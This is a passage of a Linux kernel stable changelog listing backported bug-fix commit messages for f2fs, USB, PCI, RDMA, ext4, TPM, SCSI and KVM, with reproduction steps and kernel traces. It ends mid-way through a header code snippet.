Date: Tue Sep 25 15:35:59 2018 +0800
f2fs: fix to recover inode's i\_flags during POR
[ Upstream commit 19c73a691ccf6fb2f12d4e9cf9830023966cec88 ]
Testcase to reproduce this bug:
1. mkfs.f2fs /dev/sdd
2. mount -t f2fs /dev/sdd /mnt/f2fs
3. touch /mnt/f2fs/file
4. sync
5. chattr +A /mnt/f2fs/file
6. xfs\_io -f /mnt/f2fs/file -c "fsync"
7. godown /mnt/f2fs
8. umount /mnt/f2fs
9. mount -t f2fs /dev/sdd /mnt/f2fs
10. lsattr /mnt/f2fs/file
-----------------N- /mnt/f2fs/file
But actually, we expect the corrct result is:
-------A---------N- /mnt/f2fs/file
The reason is we didn't recover inode.i\_flags field during mount,
fix it.
Signed-off-by: Chao Yu
Signed-off-by: Jaegeuk Kim
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 9e40e11233237a6ac6bb586ca4a1f2ecbbffb702
Author: Chao Yu
Date: Tue Sep 25 15:36:01 2018 +0800
f2fs: fix to recover inode's crtime during POR
[ Upstream commit 5cd1f387a13b5188b4edb4c834310302a85a6ea2 ]
Testcase to reproduce this bug:
1. mkfs.f2fs -O extra\_attr -O inode\_crtime /dev/sdd
2. mount -t f2fs /dev/sdd /mnt/f2fs
3. touch /mnt/f2fs/file
4. xfs\_io -f /mnt/f2fs/file -c "fsync"
5. godown /mnt/f2fs
6. umount /mnt/f2fs
7. mount -t f2fs /dev/sdd /mnt/f2fs
8. xfs\_io -f /mnt/f2fs/file -c "statx -r"
stat.btime.tv\_sec = 0
stat.btime.tv\_nsec = 0
This patch fixes to recover inode creation time fields during
mount.
Signed-off-by: Chao Yu
Signed-off-by: Jaegeuk Kim
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 60e562bb965a2bdcf55c4f3590e1bfa2de5bc3ff
Author: Anshuman Gupta
Date: Thu Sep 20 19:13:40 2018 +0300
xhci: Avoid USB autosuspend when resuming USB2 ports.
[ Upstream commit 330e2d61cdd58363eb5e66b2e72f76fe3c5492e0 ]
When USB bus host controller root hub resumes from autosuspend,
it immediately tries to enter auto-suspend, but there can be a
scenario when root hub is resuming its usb2 ports, in that particular
case USB host controller auto suspend fails since it is busy
to resuming its usb2 ports.
This makes multiple failed cycles of auto-suspend until all usb2
ports of host controller root hub do not resume.
This patch uses USB core framework usb\_hcd\_start\_port\_resume,
usb\_hcd\_end\_port\_resume API's in order to autoresume/autosuspend
root hub properly.
Signed-off-by: Anshuman Gupta
Signed-off-by: Mathias Nyman
Signed-off-by: Greg Kroah-Hartman
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 2c5e9a93e478118ef050e2098042a9a191baf29e
Author: Bartosz Golaszewski
Date: Fri Sep 21 06:40:07 2018 -0700
nvmem: check the return value of nvmem\_add\_cells()
[ Upstream commit fa72d847d68d7833b77a4bef944cf2c5baf56f49 ]
This function can fail so check its return value in nvmem\_register()
and act accordingly.
Signed-off-by: Bartosz Golaszewski
Signed-off-by: Srinivas Kandagatla
Signed-off-by: Greg Kroah-Hartman
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 40cdac6bfb73088484340525e045eed0f286b271
Author: Shaohua Li
Date: Mon Oct 1 18:36:36 2018 -0700
MD: fix invalid stored role for a disk
[ Upstream commit d595567dc4f0c1d90685ec1e2e296e2cad2643ac ]
If we change the number of array's device after device is removed from array,
then add the device back to array, we can see that device is added as active
role instead of spare which we expected.
Please see the below link for details:
https://marc.info/?l=linux-raid&m=153736982015076&w=2
This is caused by that we prefer to use device's previous role which is
recorded by saved\_raid\_disk, but we should respect the new number of
conf->raid\_disks since it could be changed after device is removed.
Reported-by: Gioh Kim
Tested-by: Gioh Kim
Acked-by: Guoqing Jiang
Signed-off-by: Shaohua Li
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 175d020db6cfe4314b8fc471e0da8f144d6b887f
Author: Theodore Ts'o
Date: Tue Oct 2 01:34:44 2018 -0400
ext4: fix argument checking in EXT4\_IOC\_MOVE\_EXT
[ Upstream commit f18b2b83a727a3db208308057d2c7945f368e625 ]
If the starting block number of either the source or destination file
exceeds the EOF, EXT4\_IOC\_MOVE\_EXT should return EINVAL.
Also fixed the helper function mext\_check\_coverage() so that if the
logical block is beyond EOF, make it return immediately, instead of
looping until the block number wraps all the away around. This takes
long enough that if there are multiple threads trying to do pound on
an the same inode doing non-sensical things, it can end up triggering
the kernel's soft lockup detector.
Reported-by: syzbot+c61979f6f2cba5cb3c06@syzkaller.appspotmail.com
Signed-off-by: Theodore Ts'o
Cc: stable@kernel.org
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit f41d070e9fcbd5ba0f1884947939f710276854a7
Author: Alexandre Belloni
Date: Mon Sep 10 22:12:49 2018 +0200
usb: gadget: udc: atmel: handle at91sam9rl PMC
[ Upstream commit bb80e4fa57eb75ebd64ae9be4155da6d12c1a997 ]
The at91sam9rl PMC is not quite the same as the at91sam9g45 one and now has
its own compatible string. Add support for that.
Fixes: 217bace8e548 ("ARM: dts: fix PMC compatible")
Acked-by: Cristian Birsan
Signed-off-by: Alexandre Belloni
Signed-off-by: Felipe Balbi
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 3162e793c743cb1932cca8508bfd3b579e0e1bc9
Author: Fabrice Gasnier
Date: Wed Sep 5 13:40:03 2018 +0200
usb: dwc2: fix a race with external vbus supply
[ Upstream commit 41ee1ea21052583eaf5487dfa0d0c907c9667548 ]
There's a race with root hub resume, when using external vbus supply.
Root hub gets resumed, but runtime pm autosuspend runs as external vbus
supply isn't enabled. So, host never exit from power down properly.
Initialize vbus external supply before, rater that after hub resume.
Fixes: 531ef5ebea96 ("usb: dwc2: add support for host mode external
vbus supply")
Tested-by: Artur Petrosyan
Acked-by: Minas Harutyunyan
Signed-off-by: Fabrice Gasnier
Signed-off-by: Amelie Delaunay
Signed-off-by: Felipe Balbi
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit bcb003c30ac3d3f4e4e151b59b37ceca6b3a1ca0
Author: Lina Iyer
Date: Thu Sep 27 11:18:10 2018 -0600
irqchip/pdc: Setup all edge interrupts as rising edge at GIC
[ Upstream commit 7bae48b22c8d38c5cd50f52b6e15d134e2bb3935 ]
The PDC irqchp can convert a falling edge or level low interrupt to a
rising edge or level high interrupt at the GIC. We just need to setup
the GIC correctly. Set up the interrupt type for the IRQ\_TYPE\_EDGE\_BOTH
as IRQ\_TYPE\_EDGE\_RISING at the GIC.
Fixes: f55c73aef890 ("irqchip/pdc: Add PDC interrupt controller for QCOM SoCs")
Reported-by: Evan Green
Reviewed-by: Evan Green
Signed-off-by: Lina Iyer
Signed-off-by: Marc Zyngier
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 10be774a8d446b5c4b32721be387a11a7252a522
Author: Chuck Lever
Date: Mon Oct 1 14:25:14 2018 -0400
xprtrdma: Reset credit grant properly after a disconnect
[ Upstream commit ef739b2175dde9c05594f768cb78149f1ce2ac36 ]
On a fresh connection, an RPC/RDMA client is supposed to send only
one RPC Call until it gets a credit grant in the first RPC Reply
from the server [RFC 8166, Section 3.3.3].
There is a bug in the Linux client's credit accounting mechanism
introduced by commit e7ce710a8802 ("xprtrdma: Avoid deadlock when
credit window is reset"). On connect, it simply dumps all pending
RPC Calls onto the new connection.
Servers have been tolerant of this bad behavior. Currently no server
implementation ever changes its credit grant over reconnects, and
servers always repost enough Receives before connections are fully
established.
To correct this issue, ensure that the client resets both the credit
grant \_and\_ the congestion window when handling a reconnect.
Fixes: e7ce710a8802 ("xprtrdma: Avoid deadlock when credit ... ")
Signed-off-by: Chuck Lever
Cc: stable@kernel.org
Signed-off-by: Anna Schumaker
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 5f8ffba0789c2e5d7f26fc4b9095b39279066568
Author: Mika Westerberg
Date: Thu Sep 27 16:54:13 2018 -0500
PCI / ACPI: Enable wake automatically for power managed bridges
[ Upstream commit 6299cf9ec3985cac70bede8a855b5087b81a6640 ]
We enable power management automatically for bridges where
pci\_bridge\_d3\_possible() returns true. However, these bridges may have
ACPI methods such as \_DSW that need to be called before D3 entry. For
example in Lenovo Thinkpad X1 Carbon 6th \_DSW method is used to prepare
D3cold for the PCIe root port hosting Thunderbolt chain. Because wake is
not enabled \_DSW method is never called and the port does not enter
D3cold properly consuming more power than necessary.
Users can work this around by writing "enabled" to "wakeup" sysfs file
under the device in question but that is not something an ordinary user
is expected to do.
Since we already automatically enable power management for PCIe ports
with ->bridge\_d3 set extend that to enable wake for them as well,
assuming the port has any ACPI wakeup related objects implemented in the
namespace (adev->wakeup.flags.valid is true). This ensures the necessary
ACPI methods get called at appropriate times and allows the root port in
Thinkpad X1 Carbon 6th to go into D3cold.
Signed-off-by: Mika Westerberg
Signed-off-by: Bjorn Helgaas
Reviewed-by: Rafael J. Wysocki
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit eedd2de8dc728315c36e50aa19430932d2a88ac0
Author: Jorgen Hansen
Date: Fri Sep 21 00:31:05 2018 -0700
VMCI: Resource wildcard match fixed
[ Upstream commit 11924ba5e671d6caef1516923e2bd8c72929a3fe ]
When adding a VMCI resource, the check for an existing entry
would ignore that the new entry could be a wildcard. This could
result in multiple resource entries that would match a given
handle. One disastrous outcome of this is that the
refcounting used to ensure that delayed callbacks for VMCI
datagrams have run before the datagram is destroyed can be
wrong, since the refcount could be increased on the duplicate
entry. This in turn leads to a use after free bug. This issue
was discovered by Hangbin Liu using KASAN and syzkaller.
Fixes: bc63dedb7d46 ("VMCI: resource object implementation")
Reported-by: Hangbin Liu
Reviewed-by: Adit Ranadive
Reviewed-by: Vishnu Dasa
Signed-off-by: Jorgen Hansen
Signed-off-by: Greg Kroah-Hartman
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit fe0f3e9e68305e1d6c354a9401e92c36b0427fb0
Author: Dexuan Cui
Date: Sun Sep 23 21:10:44 2018 +0000
Drivers: hv: vmbus: Use cpumask\_var\_t for on-stack cpu mask
[ Upstream commit 25355252607ca288f329ee033f387764883393f6 ]
A cpumask structure on the stack can cause a warning with
CONFIG\_NR\_CPUS=8192 (e.g. Ubuntu 16.04 and 18.04 use this):
drivers/hv//channel\_mgmt.c: In function ‘init\_vp\_index’:
drivers/hv//channel\_mgmt.c:702:1: warning: the frame size of 1032 bytes
is larger than 1024 bytes [-Wframe-larger-than=]
Nowadays it looks most distros enable CONFIG\_CPUMASK\_OFFSTACK=y, and
hence we can work around the warning by using cpumask\_var\_t.
Signed-off-by: Dexuan Cui
Cc: K. Y. Srinivasan
Cc: Haiyang Zhang
Cc: Stephen Hemminger
Cc:
Signed-off-by: K. Y. Srinivasan
Signed-off-by: Greg Kroah-Hartman
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 0e264876d8a64372154d77e7a5e0fadb1e3c70c9
Author: Jaegeuk Kim
Date: Tue Sep 25 13:54:33 2018 -0700
f2fs: clear PageError on the read path
[ Upstream commit fb7d70db305a1446864227abf711b756568f8242 ]
When running fault injection test, I hit somewhat wrong behavior in f2fs\_gc ->
gc\_data\_segment():
0. fault injection generated some PageError'ed pages
1. gc\_data\_segment
-> f2fs\_get\_read\_data\_page(REQ\_RAHEAD)
2. move\_data\_page
-> f2fs\_get\_lock\_data\_page()
-> f2f\_get\_read\_data\_page()
-> f2fs\_submit\_page\_read()
-> submit\_bio(READ)
-> return EIO due to PageError
-> fail to move data
Signed-off-by: Jaegeuk Kim
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit fbc88d502e8160eda9b8bfd80c7c30a1b28640e8
Author: Javier Martinez Canillas
Date: Thu Aug 30 16:40:05 2018 +0200
tpm: suppress transmit cmd error logs when TPM 1.2 is disabled/deactivated
[ Upstream commit 0d6d0d62d9505a9816716aa484ebd0b04c795063 ]
For TPM 1.2 chips the system setup utility allows to set the TPM device in
one of the following states:
\* Active: Security chip is functional
\* Inactive: Security chip is visible, but is not functional
\* Disabled: Security chip is hidden and is not functional
When choosing the "Inactive" state, the TPM 1.2 device is enumerated and
registered, but sending TPM commands fail with either TPM\_DEACTIVATED or
TPM\_DISABLED depending if the firmware deactivated or disabled the TPM.
Since these TPM 1.2 error codes don't have special treatment, inactivating
the TPM leads to a very noisy kernel log buffer that shows messages like
the following:
tpm\_tis 00:05: 1.2 TPM (device-id 0x0, rev-id 78)
tpm tpm0: A TPM error (6) occurred attempting to read a pcr value
tpm tpm0: TPM is disabled/deactivated (0x6)
tpm tpm0: A TPM error (6) occurred attempting get random
tpm tpm0: A TPM error (6) occurred attempting to read a pcr value
ima: No TPM chip found, activating TPM-bypass! (rc=6)
tpm tpm0: A TPM error (6) occurred attempting get random
tpm tpm0: A TPM error (6) occurred attempting get random
tpm tpm0: A TPM error (6) occurred attempting get random
tpm tpm0: A TPM error (6) occurred attempting get random
Let's just suppress error log messages for the TPM\_{DEACTIVATED,DISABLED}
return codes, since this is expected when the TPM 1.2 is set to Inactive.
In that case the kernel log is cleaner and less confusing for users, i.e:
tpm\_tis 00:05: 1.2 TPM (device-id 0x0, rev-id 78)
tpm tpm0: TPM is disabled/deactivated (0x6)
ima: No TPM chip found, activating TPM-bypass! (rc=6)
Reported-by: Hans de Goede
Signed-off-by: Javier Martinez Canillas
Reviewed-by: Jarkko Sakkinen
Signed-off-by: Jarkko Sakkinen
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 47b1c864123a5fd1452709feea371d05a30e24da
Author: Adam Thomson
Date: Mon Oct 8 13:53:59 2018 +0100
usb: typec: tcpm: Report back negotiated PPS voltage and current
[ Upstream commit 554fab6dbf20ee7298ed2d4e8398b85e6058abb7 ]
Currently when requesting a specific voltage or current through
the psy interface, for PPS, when reading back from that interface
the values will always be the same as previously given, if the
request was successful. However PPS only allows for 20mV voltage
steps and 50mA current steps, and the psy class expects microvolt
and micro amp requests, so inbetween values can be provided through
this interface. Really when reading back the true values negotiated
should be given, and not the ones originally asked for.
To report the actual values negotiated with the Source, the values
stored are now rounded down to the relevant step units prior to
building the PPS request, so that those values are later correctly
reported through the psy interface. In addition this improves the
adjustments made to meet the operating power requirements of the
platform, which previously could have been slightly out due to not
using valid PPS units of voltage and current.
Signed-off-by: Adam Thomson
Reviewed-by: Guenter Roeck
Signed-off-by: Greg Kroah-Hartman
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit b88a5dd150a562edad5be296fd63f3ba70f92528
Author: Alan Douglas
Date: Thu Oct 11 17:15:43 2018 +0100
PCI: cadence: Use AXI region 0 to signal interrupts from EP
[ Upstream commit 0652d4b6b56f73c81abbdbc7e26f772cb2dfe370 ]
The IRQ physical address is allocated from region 0, rather than
the highest region. Update the driver to reserve this region in
the bitmap and to use region 0 for all types of interrupt.
This corrects a problem which prevents the interrupt being
signalled correctly if using the first address in the AXI region,
since an offset of zero will always be mapped to region 0.
Fixes: 37dddf14f1ae ("PCI: cadence: Add EndPoint Controller driver for Cadence PCIe controller")
Signed-off-by: Alan Douglas
Signed-off-by: Lorenzo Pieralisi
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 979fbe4045c830705da2d79b551010e9ce9e37e6
Author: Honghui Zhang
Date: Mon Oct 15 16:08:52 2018 +0800
PCI: mediatek: Fix mtk\_pcie\_find\_port() endpoint/port matching logic
[ Upstream commit 074d6f32689ce05a084b6fa3db38445745bf11cc ]
The Mediatek's host controller has two slots, each with its own control
registers. The host driver needs to identify what slot is connected to
what port in order to access the device's configuration space.
Current code retrieving slot connected to a given endpoint device.
Assuming each slot is connected to one endpoint device as below:
host bridge
bus 0 --> \_\_\_\_\_\_\_\_\_\_|\_\_\_\_\_\_\_
| |
| |
slot 0 slot 1
bus 1 -->| bus 2 --> |
| |
EP 0 EP 1
During PCI enumeration, system software will scan all the PCI devices on
every bus starting from devfn 0. Using PCI\_SLOT(devfn) for matching an
endpoint to its slot is erroneous in that the devfn does not contain the
hierarchical bus numbering in it. In order to match an endpoint with its
slot (and related port), the PCI tree must be walked up to the root bus
(where the root ports are situated) and then the PCI\_SLOT(devfn)
matching logic can be correctly applied for matching.
This patch fixes the mtk\_pcie\_find\_port() slot matching logic by adding
appropriate PCI tree walking code to retrieve the slot/port a given
endpoint is connected to.
Signed-off-by: Honghui Zhang
[lorenzo.pieralisi@arm.com: rewrote the commit log]
Signed-off-by: Lorenzo Pieralisi
Acked-by: Ryder Lee
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit f91a686192f6ab6ce8d7e56693cda2cc42cee858
Author: Tudor.Ambarus@microchip.com
Date: Mon Oct 15 09:00:54 2018 +0000
usb: host: ohci-at91: fix request of irq for optional gpio
[ Upstream commit 325b9313ec3be56c8e2fe03f977fee19cec75820 ]
atmel,oc-gpio is optional. Request its irq only when atmel,oc is set
in device tree.
devm\_gpiod\_get\_index\_optional returns NULL if -ENOENT. Check its
return value for NULL before error, because it is more probable that
atmel,oc is not set.
This fixes the following errors on boards where atmel,oc is not set in
device tree:
[ 0.960000] at91\_ohci 500000.ohci: failed to request gpio "overcurrent" IRQ
[ 0.960000] at91\_ohci 500000.ohci: failed to request gpio "overcurrent" IRQ
[ 0.970000] at91\_ohci 500000.ohci: failed to request gpio "overcurrent" IRQ
Signed-off-by: Tudor Ambarus
Acked-by: Nicolas Ferre
Signed-off-by: Greg Kroah-Hartman
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit fd4049585f153cf2584746e11461424071ef9497
Author: Selvin Xavier
Date: Mon Oct 8 03:27:53 2018 -0700
RDMA/bnxt\_re: Fix recursive lock warning in debug kernel
[ Upstream commit d455f29f6d76a5f94881ca1289aaa1e90617ff5d ]
Fix possible recursive lock warning. Its a false warning as the locks are
part of two differnt HW Queue data structure - cmdq and creq. Debug kernel
is throwing the following warning and stack trace.
[ 783.914967] ============================================
[ 783.914970] WARNING: possible recursive locking detected
[ 783.914973] 4.19.0-rc2+ #33 Not tainted
[ 783.914976] --------------------------------------------
[ 783.914979] swapper/2/0 is trying to acquire lock:
[ 783.914982] 000000002aa3949d (&(&hwq->lock)->rlock){..-.}, at: bnxt\_qplib\_service\_creq+0x232/0x350 [bnxt\_re]
[ 783.914999]
but task is already holding lock:
[ 783.915002] 00000000be73920d (&(&hwq->lock)->rlock){..-.}, at: bnxt\_qplib\_service\_creq+0x2a/0x350 [bnxt\_re]
[ 783.915013]
other info that might help us debug this:
[ 783.915016] Possible unsafe locking scenario:
[ 783.915019] CPU0
[ 783.915021] ----
[ 783.915034] lock(&(&hwq->lock)->rlock);
[ 783.915035] lock(&(&hwq->lock)->rlock);
[ 783.915037]
\*\*\* DEADLOCK \*\*\*
[ 783.915038] May be due to missing lock nesting notation
[ 783.915039] 1 lock held by swapper/2/0:
[ 783.915040] #0: 00000000be73920d (&(&hwq->lock)->rlock){..-.}, at: bnxt\_qplib\_service\_creq+0x2a/0x350 [bnxt\_re]
[ 783.915044]
stack backtrace:
[ 783.915046] CPU: 2 PID: 0 Comm: swapper/2 Not tainted 4.19.0-rc2+ #33
[ 783.915047] Hardware name: Dell Inc. PowerEdge R730/0599V5, BIOS 1.0.4 08/28/2014
[ 783.915048] Call Trace:
[ 783.915049]
[ 783.915054] dump\_stack+0x90/0xe3
[ 783.915058] \_\_lock\_acquire+0x106c/0x1080
[ 783.915061] ? sched\_clock+0x5/0x10
[ 783.915063] lock\_acquire+0xbd/0x1a0
[ 783.915065] ? bnxt\_qplib\_service\_creq+0x232/0x350 [bnxt\_re]
[ 783.915069] \_raw\_spin\_lock\_irqsave+0x4a/0x90
[ 783.915071] ? bnxt\_qplib\_service\_creq+0x232/0x350 [bnxt\_re]
[ 783.915073] bnxt\_qplib\_service\_creq+0x232/0x350 [bnxt\_re]
[ 783.915078] tasklet\_action\_common.isra.17+0x197/0x1b0
[ 783.915081] \_\_do\_softirq+0xcb/0x3a6
[ 783.915084] irq\_exit+0xe9/0x100
[ 783.915085] do\_IRQ+0x6a/0x120
[ 783.915087] common\_interrupt+0xf/0xf
[ 783.915088]
Use nested notation for the spin\_lock to avoid this warning.
Signed-off-by: Selvin Xavier
Signed-off-by: Jason Gunthorpe
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 12100249f2be8a7fc6d874099ff075a99b9e12c6
Author: Selvin Xavier
Date: Mon Oct 8 03:27:56 2018 -0700
RDMA/bnxt\_re: Avoid accessing nq->bar\_reg\_iomem in failure case
[ Upstream commit ed51efd2ce44091a858ad829f666727e7c95695e ]
In the failure path, nq->bar\_reg\_iomem gets accessed without
initializing. Avoid this by calling the bnxt\_qplib\_nq\_stop\_irq only if the
initialization is complete.
Reported-by: Dan Carpenter
Fixes: 1ac5a4047975 ("RDMA/bnxt\_re: Add bnxt\_re RoCE driver")
Fixes: 6e04b1035689 ("RDMA/bnxt\_re: Fix broken RoCE driver due to recent L2 driver changes")
Signed-off-by: Selvin Xavier
Signed-off-by: Jason Gunthorpe
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 255cecf2a5ebaba4fe4b9ad11827c40283a43e14
Author: Denis Drozdov
Date: Thu Oct 11 22:33:57 2018 +0300
IB/ipoib: Clear IPCB before icmp\_send
[ Upstream commit 4d6e4d12da2c308f8f976d3955c45ee62539ac98 ]
IPCB should be cleared before icmp\_send, since it may contain data from
previous layers and the data could be misinterpreted as ip header options,
which later caused the ihl to be set to an invalid value and resulted in
the following stack corruption:
[ 1083.031512] ib0: packet len 57824 (> 2048) too long to send, dropping
[ 1083.031843] ib0: packet len 37904 (> 2048) too long to send, dropping
[ 1083.032004] ib0: packet len 4040 (> 2048) too long to send, dropping
[ 1083.032253] ib0: packet len 63800 (> 2048) too long to send, dropping
[ 1083.032481] ib0: packet len 23960 (> 2048) too long to send, dropping
[ 1083.033149] ib0: packet len 63800 (> 2048) too long to send, dropping
[ 1083.033439] ib0: packet len 63800 (> 2048) too long to send, dropping
[ 1083.033700] ib0: packet len 63800 (> 2048) too long to send, dropping
[ 1083.034124] ib0: packet len 63800 (> 2048) too long to send, dropping
[ 1083.034387] ==================================================================
[ 1083.034602] BUG: KASAN: stack-out-of-bounds in \_\_ip\_options\_echo+0xf08/0x1310
[ 1083.034798] Write of size 4 at addr ffff880353457c5f by task kworker/u16:0/7
[ 1083.034990]
[ 1083.035104] CPU: 7 PID: 7 Comm: kworker/u16:0 Tainted: G O 4.19.0-rc5+ #1
[ 1083.035316] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu2 04/01/2014
[ 1083.035573] Workqueue: ipoib\_wq ipoib\_cm\_skb\_reap [ib\_ipoib]
[ 1083.035750] Call Trace:
[ 1083.035888] dump\_stack+0x9a/0xeb
[ 1083.036031] print\_address\_description+0xe3/0x2e0
[ 1083.036213] kasan\_report+0x18a/0x2e0
[ 1083.036356] ? \_\_ip\_options\_echo+0xf08/0x1310
[ 1083.036522] \_\_ip\_options\_echo+0xf08/0x1310
[ 1083.036688] icmp\_send+0x7b9/0x1cd0
[ 1083.036843] ? icmp\_route\_lookup.constprop.9+0x1070/0x1070
[ 1083.037018] ? netif\_schedule\_queue+0x5/0x200
[ 1083.037180] ? debug\_show\_all\_locks+0x310/0x310
[ 1083.037341] ? rcu\_dynticks\_curr\_cpu\_in\_eqs+0x85/0x120
[ 1083.037519] ? debug\_locks\_off+0x11/0x80
[ 1083.037673] ? debug\_check\_no\_obj\_freed+0x207/0x4c6
[ 1083.037841] ? check\_flags.part.27+0x450/0x450
[ 1083.037995] ? debug\_check\_no\_obj\_freed+0xc3/0x4c6
[ 1083.038169] ? debug\_locks\_off+0x11/0x80
[ 1083.038318] ? skb\_dequeue+0x10e/0x1a0
[ 1083.038476] ? ipoib\_cm\_skb\_reap+0x2b5/0x650 [ib\_ipoib]
[ 1083.038642] ? netif\_schedule\_queue+0xa8/0x200
[ 1083.038820] ? ipoib\_cm\_skb\_reap+0x544/0x650 [ib\_ipoib]
[ 1083.038996] ipoib\_cm\_skb\_reap+0x544/0x650 [ib\_ipoib]
[ 1083.039174] process\_one\_work+0x912/0x1830
[ 1083.039336] ? wq\_pool\_ids\_show+0x310/0x310
[ 1083.039491] ? lock\_acquire+0x145/0x3a0
[ 1083.042312] worker\_thread+0x87/0xbb0
[ 1083.045099] ? process\_one\_work+0x1830/0x1830
[ 1083.047865] kthread+0x322/0x3e0
[ 1083.050624] ? kthread\_create\_worker\_on\_cpu+0xc0/0xc0
[ 1083.053354] ret\_from\_fork+0x3a/0x50
For instance \_\_ip\_options\_echo is failing to proceed with invalid srr and
optlen passed from another layer via IPCB
[ 762.139568] IPv4: \_\_ip\_options\_echo rr=0 ts=0 srr=43 cipso=0
[ 762.139720] IPv4: ip\_options\_build: IPCB 00000000f3cd969e opt 000000002ccb3533
[ 762.139838] IPv4: \_\_ip\_options\_echo in srr: optlen 197 soffset 84
[ 762.139852] IPv4: ip\_options\_build srr=0 is\_frag=0 rr\_needaddr=0 ts\_needaddr=0 ts\_needtime=0 rr=0 ts=0
[ 762.140269] ==================================================================
[ 762.140713] IPv4: \_\_ip\_options\_echo rr=0 ts=0 srr=0 cipso=0
[ 762.141078] BUG: KASAN: stack-out-of-bounds in \_\_ip\_options\_echo+0x12ec/0x1680
[ 762.141087] Write of size 4 at addr ffff880353457c7f by task kworker/u16:0/7
Signed-off-by: Denis Drozdov
Reviewed-by: Erez Shitrit
Reviewed-by: Feras Daoud
Signed-off-by: Leon Romanovsky
Signed-off-by: Jason Gunthorpe
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 086b1e14c5256893bc41e246eee004cf01437756
Author: Parav Pandit
Date: Sun Oct 7 12:12:40 2018 +0300
RDMA/core: Do not expose unsupported counters
[ Upstream commit 0f6ef65d1c6ec8deb5d0f11f86631ec4cfe8f22e ]
If the provider driver (such as rdma\_rxe) doesn't support pma counters,
avoid exposing its directory similar to optional hw\_counters directory.
If core fails to read the PMA counter, return an error so that user can
retry later if needed.
Fixes: 35c4cbb17811 ("IB/core: Create get\_perf\_mad function in sysfs.c")
Reported-by: Holger Hoffstätte
Tested-by: Holger Hoffstätte
Signed-off-by: Parav Pandit
Signed-off-by: Leon Romanovsky
Signed-off-by: Doug Ledford
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 9b7b9aead1865549b9c1eef56f6f71acbf74980a
Author: Wenwen Wang
Date: Sat Oct 6 13:34:21 2018 -0500
scsi: megaraid\_sas: fix a missing-check bug
[ Upstream commit 47db7873136a9c57c45390a53b57019cf73c8259 ]
In megasas\_mgmt\_compat\_ioctl\_fw(), to handle the structure
compat\_megasas\_iocpacket 'cioc', a user-space structure megasas\_iocpacket
'ioc' is allocated before megasas\_mgmt\_ioctl\_fw() is invoked to handle
the packet. Since the two data structures have different fields, the data
is copied from 'cioc' to 'ioc' field by field. In the copy process,
'sense\_ptr' is prepared if the field 'sense\_len' is not null, because it
will be used in megasas\_mgmt\_ioctl\_fw(). To prepare 'sense\_ptr', the
user-space data 'ioc->sense\_off' and 'cioc->sense\_off' are copied and
saved to kernel-space variables 'local\_sense\_off' and 'user\_sense\_off'
respectively. Given that 'ioc->sense\_off' is also copied from
'cioc->sense\_off', 'local\_sense\_off' and 'user\_sense\_off' should have the
same value. However, 'cioc' is in the user space and a malicious user can
race to change the value of 'cioc->sense\_off' after it is copied to
'ioc->sense\_off' but before it is copied to 'user\_sense\_off'. By doing
so, the attacker can inject different values into 'local\_sense\_off' and
'user\_sense\_off'. This can cause undefined behavior in the following
execution, because the two variables are supposed to be same.
This patch enforces a check on the two kernel variables 'local\_sense\_off'
and 'user\_sense\_off' to make sure they are the same after the copy. In
case they are not, an error code EINVAL will be returned.
Signed-off-by: Wenwen Wang
Acked-by: Sumit Saxena
Signed-off-by: Martin K. Petersen
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 4b4ae263d7d597c3a53aef2545d5f17b41396177
Author: Jim Mattson
Date: Fri Sep 21 10:36:17 2018 -0700
KVM: nVMX: Clear reserved bits of #DB exit qualification
[ Upstream commit cfb634fe3052aefc4e1360fa322018c9a0b49755 ]
According to volume 3 of the SDM, bits 63:15 and 12:4 of the exit
qualification field for debug exceptions are reserved (cleared to
0). However, the SDM is incorrect about bit 16 (corresponding to
DR6.RTM). This bit should be set if a debug exception (#DB) or a
breakpoint exception (#BP) occurred inside an RTM region while
advanced debugging of RTM transactional regions was enabled. Note that
this is the opposite of DR6.RTM, which "indicates (when clear) that a
debug exception (#DB) or breakpoint exception (#BP) occurred inside an
RTM region while advanced debugging of RTM transactional regions was
enabled."
There is still an issue with stale DR6 bits potentially being
misreported for the current debug exception. DR6 should not have been
modified before vectoring the #DB exception, and the "new DR6 bits"
should be available somewhere, but it was and they aren't.
Fixes: b96fb439774e1 ("KVM: nVMX: fixes to nested virt interrupt injection")
Signed-off-by: Jim Mattson
Reviewed-by: Sean Christopherson
Signed-off-by: Paolo Bonzini
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 58d06d2dbea7af4912c7a3608bcb6fd93880c3fe
Author: David Howells
Date: Thu Sep 6 10:19:24 2018 +0100
UAPI: ndctl: Fix g++-unsupported initialisation in headers
[ Upstream commit 9607871f37dc3e717639694b8d0dc738f2a68efc ]
The following code in the linux/ndctl header file:
static inline const char \*nvdimm\_bus\_cmd\_name(unsigned cmd)
{
static const char \* const names[] = {
